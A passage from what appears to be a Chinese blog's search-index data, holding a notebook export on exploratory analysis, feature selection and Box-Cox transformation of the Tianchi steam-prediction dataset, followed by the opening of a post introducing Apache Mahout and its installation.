-0.296895 -0.046270 0.195735 std 1.073333 1.076670 0.969541 1.034925 1.147286 0.963043 1.054119 1.040101 1.085916 1.014394 ... 1.064140 0.880593 1.126414 1.138454 1.130228 0.989732 0.995213 0.946896 1.040854 0.940599 min -4.814000 -5.488000 -4.283000 -3.276000 -4.921000 -1.168000 -5.649000 -5.625000 -6.059000 -6.784000 ... -2.435000 -2.413000 -4.507000 -7.698000 -4.057000 -4.627000 -4.789000 -7.477000 -2.608000 -3.346000 25% -0.664000 -0.451000 -0.978000 -0.644000 -0.497000 0.122000 -0.732000 -0.509000 -0.775000 -0.390000 ... -0.453000 -0.818000 -0.339000 -0.476000 -0.472000 -0.460000 -0.290000 -0.349000 -0.593000 -0.432000 50% 0.065000 0.195000 -0.267000 0.220000 0.118000 0.437000 -0.082000 0.018000 -0.004000 0.401000 ... -0.445000 -0.199000 0.010000 0.100000 0.155000 -0.040000 0.160000 -0.270000 0.083000 0.152000 75% 0.549000 0.589000 0.278000 0.793000 0.610000 1.928000 0.457000 0.515000 0.482000 0.904000 ... -0.434000 0.468000 0.447000 0.471000 0.627000 0.419000 0.273000 0.364000 0.651000 0.797000 max 2.100000 2.120000 1.946000 2.603000 4.475000 3.176000 1.528000 1.394000 2.408000 1.766000 ... 4.656000 3.022000 3.139000 1.428000 2.299000 5.465000 5.110000 1.671000 2.861000 3.021000 8 rows × 38 columns 上面数据显示了数据的统计信息，例如样本数，数据的均值 mean，标准差 std，最小值，最大值等 # 查看数据字段信息 1train_data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; V0 V1 V2 V3 V4 V5 V6 V7 V8 V9 ... V29 V30 V31 V32 V33 V34 V35 V36 V37 target 0 0.566 0.016 -0.143 0.407 0.452 -0.901 -1.812 -2.360 -0.436 -2.114 ... 0.136 0.109 -0.615 0.327 -4.627 -4.789 -5.101 -2.608 -3.508 0.175 1 0.968 0.437 0.066 0.566 0.194 -0.893 -1.566 -2.360 0.332 -2.114 ... -0.128 0.124 0.032 0.600 -0.843 0.160 0.364 -0.335 -0.730 0.676 2 1.013 0.568 0.235 0.370 0.112 -0.797 -1.367 -2.360 0.396 -2.114 ... -0.009 0.361 0.277 -0.116 -0.843 0.160 0.364 0.765 -0.589 0.633 3 0.733 0.368 0.283 0.165 0.599 -0.679 -1.200 -2.086 0.403 -2.114 ... 0.015 0.417 0.279 0.603 -0.843 -0.065 0.364 0.333 -0.112 0.206 4 0.684 0.638 0.260 0.209 0.337 -0.454 -1.073 -2.086 0.314 -2.114 ... 0.183 1.078 0.328 0.418 -0.843 -0.215 0.364 -0.280 -0.028 0.384 5 rows × 39 columns 上面显示训练集前 5 条数据的基本信息，可以看到数据都是浮点型数据，数据都是数值型连续型特征 1test_data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; V0 V1 V2 V3 V4 V5 V6 V7 V8 V9 ... V28 V29 V30 V31 V32 V33 V34 V35 V36 V37 0 0.368 0.380 -0.225 -0.049 0.379 0.092 0.550 0.551 0.244 0.904 ... -0.449 0.047 0.057 -0.042 0.847 0.534 -0.009 -0.190 -0.567 0.388 1 0.148 0.489 -0.247 -0.049 0.122 -0.201 0.487 0.493 -0.127 0.904 ... -0.443 0.047 0.560 0.176 0.551 0.046 -0.220 0.008 -0.294 0.104 2 -0.166 -0.062 -0.311 0.046 -0.055 0.063 0.485 0.493 -0.227 0.904 ... -0.458 -0.398 0.101 0.199 0.634 0.017 -0.234 0.008 0.373 0.569 3 0.102 0.294 -0.259 0.051 -0.183 0.148 0.474 0.504 0.010 0.904 ... -0.456 -0.398 1.007 0.137 1.042 -0.040 -0.290 0.008 -0.666 0.391 4 0.300 0.428 0.208 0.051 -0.033 0.116 0.408 0.497 0.155 0.904 ... -0.458 -0.776 0.291 0.370 0.181 -0.040 -0.290 0.008 -0.140 -0.497 5 rows × 38 columns # 画箱形图探索数据 123fig = plt.figure(figsize=(4, 6)) # 指定绘图对象宽度和高度sns.boxplot(train_data[&#x27;V0&#x27;],orient=&quot;v&quot;, width=0.5) &lt;AxesSubplot:xlabel='V0'&gt; ​ ​ 12345678# 画箱式图column = train_data.columns.tolist()[:39] # 列表头fig = plt.figure(figsize=(20, 40)) # 指定绘图对象宽度和高度for i in range(38): plt.subplot(13, 3, i + 1) # 13行3列子图 sns.boxplot(train_data[column[i]], orient=&quot;v&quot;, width=0.5) # 箱式图 plt.ylabel(column[i], fontsize=8)plt.show() ​ ​ # 查看数据分布图 查看特征变量‘V0’的数据分布直方图，并绘制 Q-Q 图查看数据是否近似于正态分布 123456plt.figure(figsize=(10,5))ax=plt.subplot(1,2,1)sns.distplot(train_data[&#x27;V0&#x27;],fit=stats.norm)ax=plt.subplot(1,2,2)res = stats.probplot(train_data[&#x27;V0&#x27;], plot=plt) ​ ​ 查看查看所有数据的直方图和 Q-Q 图，查看训练集的数据是否近似于正态分布 1234567891011121314train_cols = 6train_rows = len(train_data.columns)plt.figure(figsize=(4*train_cols,4*train_rows))i=0for col in train_data.columns: i+=1 ax=plt.subplot(train_rows,train_cols,i) sns.distplot(train_data[col],fit=stats.norm) i+=1 ax=plt.subplot(train_rows,train_cols,i) res = stats.probplot(train_data[col], plot=plt)plt.show() ​ ​ 由上面的数据分布图信息可以看出，很多特征变量（如’V1’,‘V9’,‘V24’,'V28’等）的数据分布不是正态的，数据并不跟随对角线，后续可以使用数据变换对数据进行转换。 对比同一特征变量‘V0’下，训练集数据和测试集数据的分布情况，查看数据分布是否一致 12345ax = sns.kdeplot(train_data[&#x27;V0&#x27;], color=&quot;Red&quot;, shade=True)ax = sns.kdeplot(test_data[&#x27;V0&#x27;], color=&quot;Blue&quot;, shade=True)ax.set_xlabel(&#x27;V0&#x27;)ax.set_ylabel(&quot;Frequency&quot;)ax = ax.legend([&quot;train&quot;,&quot;test&quot;]) ​ ​ 查看所有特征变量下，训练集数据和测试集数据的分布情况，分析并寻找出数据分布不一致的特征变量。 123456789101112131415dist_cols = 6dist_rows = len(test_data.columns)plt.figure(figsize=(4*dist_cols,4*dist_rows))i=1for col in test_data.columns: ax=plt.subplot(dist_rows,dist_cols,i) ax = sns.kdeplot(train_data[col], color=&quot;Red&quot;, shade=True) ax = sns.kdeplot(test_data[col], color=&quot;Blue&quot;, shade=True) ax.set_xlabel(col) ax.set_ylabel(&quot;Frequency&quot;) ax = ax.legend([&quot;train&quot;,&quot;test&quot;]) i+=1plt.show() ​ ​ 查看特征’V5’, ‘V17’, ‘V28’, ‘V22’, ‘V11’, 'V9’数据的数据分布 12345678910111213141516drop_col = 6drop_row = 1plt.figure(figsize=(5*drop_col,5*drop_row))i=1for col in [&quot;V5&quot;,&quot;V9&quot;,&quot;V11&quot;,&quot;V17&quot;,&quot;V22&quot;,&quot;V28&quot;]: ax =plt.subplot(drop_row,drop_col,i) ax = sns.kdeplot(train_data[col], color=&quot;Red&quot;, shade=True) ax = sns.kdeplot(test_data[col], color=&quot;Blue&quot;, shade=True) ax.set_xlabel(col) ax.set_ylabel(&quot;Frequency&quot;) ax = ax.legend([&quot;train&quot;,&quot;test&quot;]) i+=1plt.show() ​ ​ 由上图的数据分布可以看到特征’V5’,‘V9’,‘V11’,‘V17’,‘V22’,‘V28’ 训练集数据与测试集数据分布不一致，会导致模型泛化能力差，采用删除此类特征方法。 12drop_columns = [&#x27;V5&#x27;,&#x27;V9&#x27;,&#x27;V11&#x27;,&#x27;V17&#x27;,&#x27;V22&#x27;,&#x27;V28&#x27;]#合并训练集和测试集数据，并可视化训练集和测试集数据特征分布图 # 可视化线性回归关系 查看特征变量‘V0’与’target’变量的线性回归关系 1234567891011121314151617fcols = 2frows = 1plt.figure(figsize=(8,4))ax=plt.subplot(1,2,1)sns.regplot(x=&#x27;V0&#x27;, y=&#x27;target&#x27;, data=train_data, ax=ax, scatter_kws=&#123;&#x27;marker&#x27;:&#x27;.&#x27;,&#x27;s&#x27;:3,&#x27;alpha&#x27;:0.3&#125;, line_kws=&#123;&#x27;color&#x27;:&#x27;k&#x27;&#125;);plt.xlabel(&#x27;V0&#x27;)plt.ylabel(&#x27;target&#x27;)ax=plt.subplot(1,2,2)sns.distplot(train_data[&#x27;V0&#x27;].dropna())plt.xlabel(&#x27;V0&#x27;)plt.show() ​ ​ 查看所有特征变量与’target’变量的线性回归关系 123456789101112131415161718fcols = 6frows = len(test_data.columns)plt.figure(figsize=(5*fcols,4*frows))i=0for col in test_data.columns: i+=1 ax=plt.subplot(frows,fcols,i) sns.regplot(x=col, y=&#x27;target&#x27;, data=train_data, ax=ax, scatter_kws=&#123;&#x27;marker&#x27;:&#x27;.&#x27;,&#x27;s&#x27;:3,&#x27;alpha&#x27;:0.3&#125;, line_kws=&#123;&#x27;color&#x27;:&#x27;k&#x27;&#125;); plt.xlabel(col) plt.ylabel(&#x27;target&#x27;) i+=1 ax=plt.subplot(frows,fcols,i) sns.distplot(train_data[col].dropna()) plt.xlabel(col) ​ ​ # 查看特征变量的相关性 123data_train1 = train_data.drop([&#x27;V5&#x27;,&#x27;V9&#x27;,&#x27;V11&#x27;,&#x27;V17&#x27;,&#x27;V22&#x27;,&#x27;V28&#x27;],axis=1)train_corr = data_train1.corr()train_corr .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; V0 V1 V2 V3 V4 V6 V7 V8 V10 V12 ... V29 V30 V31 V32 V33 V34 V35 V36 V37 target V0 1.000000 0.908607 0.463643 0.409576 0.781212 0.189267 0.141294 0.794013 0.298443 0.751830 ... 0.302145 0.156968 0.675003 0.050951 0.056439 -0.019342 0.138933 0.231417 -0.494076 0.873212 V1 0.908607 1.000000 0.506514 0.383924 0.657790 0.276805 0.205023 0.874650 0.310120 0.656186 ... 0.147096 0.175997 0.769745 0.085604 0.035129 -0.029115 0.146329 0.235299 -0.494043 0.871846 V2 0.463643 0.506514 1.000000 0.410148 0.057697 0.615938 0.477114 0.703431 0.346006 0.059941 ... -0.275764 0.175943 0.653764 0.033942 0.050309 -0.025620 0.043648 0.316462 -0.734956 0.638878 V3 0.409576 0.383924 0.410148 1.000000 0.315046 0.233896 0.197836 0.411946 0.321262 0.306397 ... 0.117610 0.043966 0.421954 -0.092423 -0.007159 -0.031898 0.080034 0.324475 -0.229613 0.512074 V4 0.781212 0.657790 0.057697 0.315046 1.000000 -0.117529 -0.052370 0.449542 0.141129 0.927685 ... 0.659093 0.022807 0.447016 -0.026186 0.062367 0.028659 0.100010 0.113609 -0.031054 0.603984 V6 0.189267 0.276805 0.615938 0.233896 -0.117529 1.000000 0.917502 0.468233 0.415660 -0.087312 ... -0.467980 0.188907 0.546535 0.144550 0.054210 -0.002914 0.044992 0.433804 -0.404817 0.370037 V7 0.141294 0.205023 0.477114 0.197836 -0.052370 0.917502 1.000000 0.389987 0.310982 -0.036791 ... -0.311363 0.170113 0.475254 0.122707 0.034508 -0.019103 0.111166 0.340479 -0.292285 0.287815 V8 0.794013 0.874650 0.703431 0.411946 0.449542 0.468233 0.389987 1.000000 0.419703 0.420557 ... -0.011091 0.150258 0.878072 0.038430 0.026843 -0.036297 0.179167 0.326586 -0.553121 0.831904 V10 0.298443 0.310120 0.346006 0.321262 0.141129 0.415660 0.310982 0.419703 1.000000 0.140462 ... -0.105042 -0.036705 0.560213 -0.093213 0.016739 -0.026994 0.026846 0.922190 -0.045851 0.394767 V12 0.751830 0.656186 0.059941 0.306397 0.927685 -0.087312 -0.036791 0.420557 0.140462 1.000000 ... 0.666775 0.028866 0.441963 -0.007658 0.046674 0.010122 0.081963 0.112150 -0.054827 0.594189 V13 0.185144 0.157518 0.204762 -0.003636 0.075993 0.138367 0.110973 0.153299 -0.059553 0.098771 ... 0.008235 0.027328 0.113743 0.130598 0.157513 0.116944 0.219906 -0.024751 -0.379714 0.203373 V14 -0.004144 -0.006268 -0.106282 -0.232677 0.023853 0.072911 0.163931 0.008138 -0.077543 0.020069 ... 0.056814 -0.004057 0.010989 0.106581 0.073535 0.043218 0.233523 -0.086217 0.010553 0.008424 V15 0.314520 0.164702 -0.224573 0.143457 0.615704 -0.431542 -0.291272 0.018366 -0.046737 0.642081 ... 0.951314 -0.111311 0.011768 -0.104618 0.050254 0.048602 0.100817 -0.051861 0.245635 0.154020 V16 0.347357 0.435606 0.782474 0.394517 0.023818 0.847119 0.752683 0.680031 0.546975 0.025736 ... -0.342210 0.154794 0.778538 0.041474 0.028878 -0.054775 0.082293 0.551880 -0.420053 0.536748 V18 0.148622 0.123862 0.132105 0.022868 0.136022 0.110570 0.098691 0.093682 -0.024693 0.119833 ... 0.053958 0.470341 0.079718 0.411967 0.512139 0.365410 0.152088 0.019603 -0.181937 0.170721 V19 -0.100294 -0.092673 -0.161802 -0.246008 -0.205729 0.215290 0.158371 -0.144693 0.074903 -0.148319 ... -0.205409 0.100133 -0.131542 0.144018 -0.021517 -0.079753 -0.220737 0.087605 0.012115 -0.114976 V20 0.462493 0.459795 0.298385 0.289594 0.291309 0.136091 0.089399 0.412868 0.207612 0.271559 ... 0.016233 0.086165 0.326863 0.050699 0.009358 -0.000979 0.048981 0.161315 -0.322006 0.444965 V21 -0.029285 -0.012911 -0.030932 0.114373 0.174025 -0.051806 -0.065300 -0.047839 0.082288 0.144371 ... 0.157097 -0.077945 0.053025 -0.159128 -0.087561 -0.053707 -0.199398 0.047340 0.315470 -0.010063 V23 0.231136 0.222574 0.065509 0.081374 0.196530 0.069901 0.125180 0.174124 -0.066537 0.180049 ... 0.116122 0.363963 0.129783 0.367086 0.183666 0.196681 0.635252 -0.035949 -0.187582 0.226331 V24 -0.324959 -0.233556 0.010225 -0.237326 -0.529866 0.072418 -0.030292 -0.136898 -0.029420 -0.550881 ... -0.642370 0.033532 -0.202097 0.060608 -0.134320 -0.095588 -0.243738 -0.041325 -0.137614 -0.264815 V25 -0.200706 -0.070627 0.481785 -0.100569 -0.444375 0.438610 0.316744 0.173320 0.079805 -0.448877 ... -0.575154 0.088238 0.201243 0.065501 -0.013312 -0.030747 -0.093948 0.069302 -0.246742 -0.019373 V26 -0.125140 -0.043012 0.035370 -0.027685 -0.080487 0.106055 0.160566 0.015724 0.072366 -0.124111 ... -0.133694 -0.057247 0.062879 -0.004545 -0.034596 0.051294 0.085576 0.064963 0.010880 -0.046724 V27 0.733198 0.824198 0.726250 0.392006 0.412083 0.474441 0.424185 0.901100 0.246085 0.374380 ... -0.032772 0.208074 0.790239 0.095127 0.030135 -0.036123 0.159884 0.226713 -0.617771 0.812585 V29 0.302145 0.147096 -0.275764 0.117610 0.659093 -0.467980 -0.311363 -0.011091 -0.105042 0.666775 ... 1.000000 -0.122817 -0.004364 -0.110699 0.035272 0.035392 0.078588 -0.099309 0.285581 0.123329 V30 0.156968 0.175997 0.175943 0.043966 0.022807 0.188907 0.170113 0.150258 -0.036705 0.028866 ... -0.122817 1.000000 0.114318 0.695725 0.083693 -0.028573 -0.027987 0.006961 -0.256814 0.187311 V31 0.675003 0.769745 0.653764 0.421954 0.447016 0.546535 0.475254 0.878072 0.560213 0.441963 ... -0.004364 0.114318 1.000000 0.016782 0.016733 -0.047273 0.152314 0.510851 -0.357785 0.750297 V32 0.050951 0.085604 0.033942 -0.092423 -0.026186 0.144550 0.122707 0.038430 -0.093213 -0.007658 ... -0.110699 0.695725 0.016782 1.000000 0.105255 0.069300 0.016901 -0.054411 -0.162417 0.066606 V33 0.056439 0.035129 0.050309 -0.007159 0.062367 0.054210 0.034508 0.026843 0.016739 0.046674 ... 0.035272 0.083693 0.016733 0.105255 1.000000 0.719126 0.167597 0.031586 -0.062715 0.077273 V34 -0.019342 -0.029115 -0.025620 -0.031898 0.028659 -0.002914 -0.019103 -0.036297 -0.026994 0.010122 ... 0.035392 -0.028573 -0.047273 0.069300 0.719126 1.000000 0.233616 -0.019032 -0.006854 -0.006034 V35 0.138933 0.146329 0.043648 0.080034 0.100010 0.044992 0.111166 0.179167 0.026846 0.081963 ... 0.078588 -0.027987 0.152314 0.016901 0.167597 0.233616 1.000000 0.025401 -0.077991 0.140294 V36 0.231417 0.235299 0.316462 0.324475 0.113609 0.433804 0.340479 0.326586 0.922190 0.112150 ... -0.099309 0.006961 0.510851 -0.054411 0.031586 -0.019032 0.025401 1.000000 -0.039478 0.319309 V37 -0.494076 -0.494043 -0.734956 -0.229613 -0.031054 -0.404817 -0.292285 -0.553121 -0.045851 -0.054827 ... 0.285581 -0.256814 -0.357785 -0.162417 -0.062715 -0.006854 -0.077991 -0.039478 1.000000 -0.565795 target 0.873212 0.871846 0.638878 0.512074 0.603984 0.370037 0.287815 0.831904 0.394767 0.594189 ... 0.123329 0.187311 0.750297 0.066606 0.077273 -0.006034 0.140294 0.319309 -0.565795 1.000000 33 rows × 33 columns 12345# 画出相关性热力图ax = plt.subplots(figsize=(20, 16))#调整画布大小ax = sns.heatmap(train_corr, vmax=.8, square=True, annot=True)#画热力图 annot=True 显示系数 ​ ​ 1234567891011# 找出相关程度data_train1 = train_data.drop([&#x27;V5&#x27;,&#x27;V9&#x27;,&#x27;V11&#x27;,&#x27;V17&#x27;,&#x27;V22&#x27;,&#x27;V28&#x27;],axis=1)plt.figure(figsize=(20, 16)) # 指定绘图对象宽度和高度colnm = data_train1.columns.tolist() # 列表头mcorr = data_train1[colnm].corr(method=&quot;spearman&quot;) # 相关系数矩阵，即给出了任意两个变量之间的相关系数mask = np.zeros_like(mcorr, dtype=np.bool) # 构造与mcorr同维数矩阵 为bool型mask[np.triu_indices_from(mask)] = True # 角分线右侧为Truecmap = sns.diverging_palette(220, 10, as_cmap=True) # 返回matplotlib colormap对象g = sns.heatmap(mcorr, mask=mask, cmap=cmap, square=True, annot=True, fmt=&#x27;0.2f&#x27;) # 热力图（看两两相似度）plt.show() ​ ​ 上图为所有特征变量和 target 变量两两之间的相关系数，由此可以看出各个特征变量 V0-V37 之间的相关性以及特征变量 V0-V37 与 target 的相关性。 # 查找出特征变量和 target 变量相关系数大于 0.5 的特征变量 1234567891011#寻找K个最相关的特征信息k = 10 # number of variables for heatmapcols = train_corr.nlargest(k, &#x27;target&#x27;)[&#x27;target&#x27;].indexcm = np.corrcoef(train_data[cols].values.T)hm = plt.subplots(figsize=(10, 10))#调整画布大小#hm = sns.heatmap(cm, cbar=True, annot=True, square=True)#g = sns.heatmap(train_data[cols].corr(),annot=True,square=True,cmap=&quot;RdYlGn&quot;)hm = sns.heatmap(train_data[cols].corr(),annot=True,square=True)plt.show() ​ ​ 1234567threshold = 0.5corrmat = train_data.corr()top_corr_features = corrmat.index[abs(corrmat[&quot;target&quot;])&gt;threshold]plt.figure(figsize=(10,10))g = sns.heatmap(train_data[top_corr_features].corr(),annot=True,cmap=&quot;RdYlGn&quot;) ​ ​ 12drop_columns.clear()drop_columns = [&#x27;V5&#x27;,&#x27;V9&#x27;,&#x27;V11&#x27;,&#x27;V17&#x27;,&#x27;V22&#x27;,&#x27;V28&#x27;] 1234567# Threshold for removing correlated variablesthreshold = 0.5# Absolute value correlation matrixcorr_matrix = data_train1.corr().abs()drop_col=corr_matrix[corr_matrix[&quot;target&quot;]&lt;threshold].index#data_all.drop(drop_col, axis=1, inplace=True) 由于’V14’, ‘V21’, ‘V25’, ‘V26’, ‘V32’, ‘V33’, 'V34’特征的相关系数值小于 0.5，故认为这些特征与最终的预测 target 值不相关，删除这些特征变量； 12345678910#merge train_set and test_settrain_x = train_data.drop([&#x27;target&#x27;], axis=1)#data_all=pd.concat([train_data,test_data],axis=0,ignore_index=True)data_all = pd.concat([train_x,test_data]) data_all.drop(drop_columns,axis=1,inplace=True)#View datadata_all.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; V0 V1 V2 V3 V4 V6 V7 V8 V10 V12 ... V27 V29 V30 V31 V32 V33 V34 V35 V36 V37 0 0.566 0.016 -0.143 0.407 0.452 -1.812 -2.360 -0.436 -0.940 -0.073 ... 0.168 0.136 0.109 -0.615 0.327 -4.627 -4.789 -5.101 -2.608 -3.508 1 0.968 0.437 0.066 0.566 0.194 -1.566 -2.360 0.332 0.188 -0.134 ... 0.338 -0.128 0.124 0.032 0.600 -0.843 0.160 0.364 -0.335 -0.730 2 1.013 0.568 0.235 0.370 0.112 -1.367 -2.360 0.396 0.874 -0.072 ... 0.326 -0.009 0.361 0.277 -0.116 -0.843 0.160 0.364 0.765 -0.589 3 0.733 0.368 0.283 0.165 0.599 -1.200 -2.086 0.403 0.011 -0.014 ... 0.277 0.015 0.417 0.279 0.603 -0.843 -0.065 0.364 0.333 -0.112 4 0.684 0.638 0.260 0.209 0.337 -1.073 -2.086 0.314 -0.251 0.199 ... 0.332 0.183 1.078 0.328 0.418 -0.843 -0.215 0.364 -0.280 -0.028 5 rows × 32 columns 12345678# normalise numeric columnscols_numeric=list(data_all.columns)def scale_minmax(col): return (col-col.min())/(col.max()-col.min())data_all[cols_numeric] = data_all[cols_numeric].apply(scale_minmax,axis=0)data_all[cols_numeric].describe() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; V0 V1 V2 V3 V4 V6 V7 V8 V10 V12 ... V27 V29 V30 V31 V32 V33 V34 V35 V36 V37 count 4813.000000 4813.000000 4813.000000 4813.000000 4813.000000 4813.000000 4813.000000 4813.000000 4813.000000 4813.000000 ... 4813.000000 4813.000000 4813.000000 4813.000000 4813.000000 4813.000000 4813.000000 4813.000000 4813.000000 4813.000000 mean 0.694172 0.721357 0.602300 0.603139 0.523743 0.748823 0.745740 0.715607 0.348518 0.578507 ... 0.881401 0.388683 0.589459 0.792709 0.628824 0.458493 0.483790 0.762873 0.332385 0.545795 std 0.144198 0.131443 0.140628 0.152462 0.106430 0.132560 0.132577 0.118105 0.134882 0.105088 ... 0.128221 0.133475 0.130786 0.102976 0.155003 0.099095 0.101020 0.102037 0.127456 0.150356 min 0.000000 0.000000 0.000000 0.000000 0.000000 0.000000 0.000000 0.000000 0.000000 0.000000 ... 0.000000 0.000000 0.000000 0.000000 0.000000 0.000000 0.000000 0.000000 0.000000 0.000000 25% 0.626676 0.679416 0.514414 0.503888 0.478182 0.683324 0.696938 0.664934 0.284327 0.532892 ... 0.888575 0.292445 0.550092 0.761816 0.562461 0.409037 0.454490 0.727273 0.270584 0.445647 50% 0.729488 0.752497 0.617072 0.614270 0.535866 0.774125 0.771974 0.742884 0.366469 0.591635 ... 0.916015 0.375734 0.594428 0.815055 0.643056 0.454518 0.499949 0.800020 0.347056 0.539317 75% 0.790195 0.799553 0.700464 0.710474 0.585036 0.842259 0.836405 0.790835 0.432965 0.641971 ... 0.932555 0.471837 0.650798 0.852229 0.719777 0.500000 0.511365 0.800020 0.414861 0.643061 max 1.000000 1.000000 1.000000 1.000000 1.000000 1.000000 1.000000 1.000000 1.000000 1.000000 ... 1.000000 1.000000 1.000000 1.000000 1.000000 1.000000 1.000000 1.000000 1.000000 1.000000 8 rows × 32 columns 1234567#col_data_process = cols_numeric.append(&#x27;target&#x27;)train_data_process = train_data[cols_numeric]train_data_process = train_data_process[cols_numeric].apply(scale_minmax,axis=0)test_data_process = test_data[cols_numeric]test_data_process = test_data_process[cols_numeric].apply(scale_minmax,axis=0) 12cols_numeric_left = cols_numeric[0:13]cols_numeric_right = cols_numeric[13:] 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849## Check effect of Box-Cox transforms on distributions of continuous variablestrain_data_process = pd.concat([train_data_process, train_data[&#x27;target&#x27;]], axis=1)fcols = 6frows = len(cols_numeric_left)plt.figure(figsize=(4*fcols,4*frows))i=0for var in cols_numeric_left: dat = train_data_process[[var, &#x27;target&#x27;]].dropna() i+=1 plt.subplot(frows,fcols,i) sns.distplot(dat[var] , fit=stats.norm); plt.title(var+&#x27; Original&#x27;) plt.xlabel(&#x27;&#x27;) i+=1 plt.subplot(frows,fcols,i) _=stats.probplot(dat[var], plot=plt) plt.title(&#x27;skew=&#x27;+&#x27;&#123;:.4f&#125;&#x27;.format(stats.skew(dat[var]))) plt.xlabel(&#x27;&#x27;) plt.ylabel(&#x27;&#x27;) i+=1 plt.subplot(frows,fcols,i) plt.plot(dat[var], dat[&#x27;target&#x27;],&#x27;.&#x27;,alpha=0.5) plt.title(&#x27;corr=&#x27;+&#x27;&#123;:.2f&#125;&#x27;.format(np.corrcoef(dat[var], dat[&#x27;target&#x27;])[0][1])) i+=1 plt.subplot(frows,fcols,i) trans_var, lambda_var = stats.boxcox(dat[var].dropna()+1) trans_var = scale_minmax(trans_var) sns.distplot(trans_var , fit=stats.norm); plt.title(var+&#x27; Tramsformed&#x27;) plt.xlabel(&#x27;&#x27;) i+=1 plt.subplot(frows,fcols,i) _=stats.probplot(trans_var, plot=plt) plt.title(&#x27;skew=&#x27;+&#x27;&#123;:.4f&#125;&#x27;.format(stats.skew(trans_var))) plt.xlabel(&#x27;&#x27;) plt.ylabel(&#x27;&#x27;) i+=1 plt.subplot(frows,fcols,i) plt.plot(trans_var, dat[&#x27;target&#x27;],&#x27;.&#x27;,alpha=0.5) plt.title(&#x27;corr=&#x27;+&#x27;&#123;:.2f&#125;&#x27;.format(np.corrcoef(trans_var,dat[&#x27;target&#x27;])[0][1])) ​ ​ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748## Check effect of Box-Cox transforms on distributions of continuous variablesfcols = 6frows = len(cols_numeric_right)plt.figure(figsize=(4*fcols,4*frows))i=0for var in cols_numeric_right: dat = train_data_process[[var, &#x27;target&#x27;]].dropna() i+=1 plt.subplot(frows,fcols,i) sns.distplot(dat[var] , fit=stats.norm); plt.title(var+&#x27; Original&#x27;) plt.xlabel(&#x27;&#x27;) i+=1 plt.subplot(frows,fcols,i) _=stats.probplot(dat[var], plot=plt) plt.title(&#x27;skew=&#x27;+&#x27;&#123;:.4f&#125;&#x27;.format(stats.skew(dat[var]))) plt.xlabel(&#x27;&#x27;) plt.ylabel(&#x27;&#x27;) i+=1 plt.subplot(frows,fcols,i) plt.plot(dat[var], dat[&#x27;target&#x27;],&#x27;.&#x27;,alpha=0.5) plt.title(&#x27;corr=&#x27;+&#x27;&#123;:.2f&#125;&#x27;.format(np.corrcoef(dat[var], dat[&#x27;target&#x27;])[0][1])) i+=1 plt.subplot(frows,fcols,i) trans_var, lambda_var = stats.boxcox(dat[var].dropna()+1) trans_var = scale_minmax(trans_var) sns.distplot(trans_var , fit=stats.norm); plt.title(var+&#x27; Tramsformed&#x27;) plt.xlabel(&#x27;&#x27;) i+=1 plt.subplot(frows,fcols,i) _=stats.probplot(trans_var, plot=plt) plt.title(&#x27;skew=&#x27;+&#x27;&#123;:.4f&#125;&#x27;.format(stats.skew(trans_var))) plt.xlabel(&#x27;&#x27;) plt.ylabel(&#x27;&#x27;) i+=1 plt.subplot(frows,fcols,i) plt.plot(trans_var, dat[&#x27;target&#x27;],&#x27;.&#x27;,alpha=0.5) plt.title(&#x27;corr=&#x27;+&#x27;&#123;:.2f&#125;&#x27;.format(np.corrcoef(trans_var,dat[&#x27;target&#x27;])[0][1])) ​ ​","categories":[{"name":"天池机器学习入门","slug":"天池机器学习入门","permalink":"http://example.com/categories/%E5%A4%A9%E6%B1%A0%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"Mahout简介","slug":"Hive学习/Mahout","date":"2021-11-07T07:47:06.000Z","updated":"2021-12-08T08:12:09.505Z","comments":true,"path":"2021/11/07/Hive学习/Mahout/","link":"","permalink":"http://example.com/2021/11/07/Hive%E5%AD%A6%E4%B9%A0/Mahout/","excerpt":"","text":"# Mahout 安装部署 # Mahout 是什么 Apache Mahout 是 Apache Software Foundation （ASF）旗下的一个开源项目，提供了一些经典的机器学习的算法，皆在帮助开发人员更加方便快捷地创建智能应用程序。目前已经有了三个公共发型版本，通过 ApacheMahout 库，Mahout 可以有效地扩展到云中。Mahout 包括许多实现，包括聚类、分类、推荐引擎、频繁子项挖掘。 Apache Mahout 的主要目标是建立可伸缩的机器学习算法。这种可伸缩性是针对大规模的数据集而言的。Apache Mahout 的算法运行在 ApacheHadoop 平台下，它通过 Mapreduce 模式实现。但是，Apache Mahout 并非严格要求算法的实现基于 Hadoop 平台，单个节点或非 Hadoop 平台也可以。Apache Mahout 核心库的非分布式算法也具有良好的性能。 Mahout 是一个机器学习 Java 类库的集合，用于完成各种各样的任务，如分类、评价性的聚类和模式挖掘等。 Mahout 开源项目就是一个 Hadoop 云平台的算法库，已经实现了多种经典算法，并一直在扩充中，其目标就是致力于创建一个可扩容的云平台算法库。 在 Hadoop 云平台下编程不仅要求用户对 Hadoop 云平台框架比较熟悉，还要对 Hadoop 云平台下底层数据流、Map 和 Reduce 原理非常熟悉，这是基本的编程要求。此外，用户要编写某一个算法还需要对该算法的原理比较熟悉，即需要对算法原理理解透彻。总体来看，编写云平台下的算法程序是属于高难度的开发工作了。但是，如果使用 Mahout，情况就会有很大的不同，用户再也不用自己编写复杂的算法，不需要掌握太高深的云平台的框架和数据流程的理论知识。用户所需要了解的只是算法的大概原理、算法实际应用环境和如何调用 Mahout 相关算法的程序接口。当然，在具体的项目中，用户还应该根据实际需求在 Mahout 源代码基础上进行二次开发以满足具体的实际应用情况。 # 安装方法 下载安装包并解压，安装前确保 Hadoop 能正常使用 12tar 